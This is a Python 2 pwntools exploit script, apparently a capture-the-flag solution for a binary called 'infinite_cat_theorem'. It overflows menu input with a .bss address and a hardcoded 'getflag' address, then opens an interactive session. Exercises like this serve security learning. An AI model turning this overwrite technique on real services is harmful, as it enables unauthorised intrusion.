from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./infinite_cat_theorem"

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name) #, env = {})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass

#libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def rr ():
  r.recvuntil (">> ")

getflag = 0x400DFE
bss = elf.bss (0x300)

def menu (idx):
  rr ()
  r.send ((str(idx)+"\x00").ljust (0x10, "A") + p64(bss) + p64(getflag))

def gen ():
  menu (1) 
  return r.recvline ()[:-1]

def submit ():
  menu (2)

def bye ():
  menu (3)


cmd = """
b * 0x000400E5e
c
"""
do_debug (cmd)

print gen ()
count = 1

for i in xrange (101):
  gen ()
  count += 1

while True:
  hh = gen ().decode ('hex')
  count += 1
  if "\n" not in hh and "\x00" not in hh:
    print count
    print hh.encode ('hex')
    break

bye ()
r.interactive ()
